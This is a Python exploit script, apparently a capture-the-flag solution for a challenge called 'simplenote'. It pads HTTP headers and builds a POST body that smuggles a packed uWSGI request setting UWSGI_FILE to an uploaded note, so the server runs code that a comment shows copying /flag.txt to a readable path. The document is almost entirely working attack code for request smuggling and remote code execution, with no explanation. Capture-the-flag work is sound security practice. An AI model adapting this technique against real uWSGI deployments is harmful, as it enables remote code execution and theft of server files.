import requests
import base64

def getpossiblities(idx,tryt = "\x09",last=False):
    init = "AAAA"
    init += "A" * idx
    prefix = "ee"
    if(last != False):
        prefix = last * 2
    for i in range(499):
        init += prefix+"\x09"+tryt
    
    if(idx > 0):
        init = init[0:-idx]
    init = init[0:-1] + "A"
    return init

def convint(i):
    return (bytes([i]) + b"\x00").decode()
def packvar(key,val):
    return convint(len(key)) + key + convint(len(val)) + val
tried = [0,2,1,0,0,2,-1,0,2,1,3,1,0,-1,2,0,2,1,2,0,-1,0,1,3,1,3,1,-1,1,2,1,3,-1]
url = "http://localhost:8000/"
url = "http://simplenote.chal.perfect.blue/"
"""
note path which includes following payload:

open("/tmp/notes/sg.txt","w+").write(open("/flag.txt").read())
"""
note = "/notes/96bd3698a91745f4ae47456af65a7e5a"

headers = {"host" : "localhost:8000"}
ltried = len(tried)
for j in range(32):
    t = "d" * 2000
    if(j<ltried):
        if(tried[j] != -1):
            t = getpossiblities(tried[j])
    elif(j == ltried):
        t = getpossiblities(i,"\x09",chr(40+i))
    headers[str(j)] = t

headers["32"] =  "A" * (814)
# headers["32"] =  "A" * (811)

offset = (168)
data  = "B" * offset
r = packvar("UWSGI_FILE","/tmp"+note)
r += packvar("SERVER_NAME","a")
r += packvar("SERVER_PORT","80")
r += packvar("REQUEST_METHOD","GET")
r += packvar("SCRIPT_NAME","a")

payloadWTF = "\x00" + convint(len(r)) + "\x00" + r
data += payloadWTF
data += "~" * (4000 - offset - 4)

r = requests.post(url,headers=headers,data=data)
print(r.text)
